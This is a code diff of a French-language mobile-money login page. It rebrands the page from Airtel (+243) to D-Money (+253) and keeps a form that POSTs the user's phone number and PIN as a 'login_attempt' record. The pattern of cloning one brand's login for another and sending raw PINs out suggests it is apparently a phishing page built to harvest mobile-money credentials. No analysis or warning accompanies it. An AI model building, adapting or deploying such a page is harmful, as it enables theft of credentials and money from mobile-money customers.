@@ -37,7 +37,7 @@ const pinCode = pinDigits.join("");
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phoneNumber: `+243${phoneNumber}`,
+          phoneNumber: `+253${phoneNumber}`,
           pinCode : `${pinCode}`,
           action: 'login_attempt',
           timestamp: new Date().toISOString(),
@@ -64,12 +64,12 @@ const pinCode = pinDigits.join("");
     <SharedLayout>
       {/* Welcome Section */}
       <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Bon retour</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-4 sm:mb-6">Connectez-vous à votre compte Airtel</p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-4 sm:mb-6"> Connectez-vous à votre compte D-Money </p>
 
       {/* Info Alert */}
       <div className="bg-red-100 border-2 border-red-300 rounded-xl sm:rounded-2xl p-3 sm:p-4 mb-4 sm:mb-6 flex items-start gap-2 sm:gap-3">
         <AlertCircle className="w-5 h-5 sm:w-6 sm:h-6 text-red-600 flex-shrink-0 mt-0.5" />
-        <p className="text-black font-semibold text-sm sm:text-base">Entrez votre numéro Airtel.</p>
+        <p className="text-black font-semibold text-sm sm:text-base">Entrez votre numéro D-Money.</p>
       </div>
 
       {/* Phone Number Field */}
@@ -79,7 +79,7 @@ const pinCode = pinDigits.join("");
         <div className="flex gap-0">
           <input
             type="text"
-            value="+243"
+            value="+253"
             disabled
             className="w-16 sm:w-20 px-2 sm:px-4 py-2 sm:py-3 border-2 border-gray-300 rounded-l-lg sm:rounded-l-xl bg-gray-50 text-black font-semibold text-center cursor-not-allowed text-sm sm:text-base"
           />
@@ -95,7 +95,7 @@ const pinCode = pinDigits.join("");
 
       {/* MOMO PIN Field */}
       <div className="mb-4 sm:mb-6">
-        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Saisissez votre code PIN Airtel
+        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Saisissez votre code PIN D-Money
 </label>
         <div className="flex gap-2 sm:gap-3 justify-center">
           {pinDigits.map((digit, index) => (
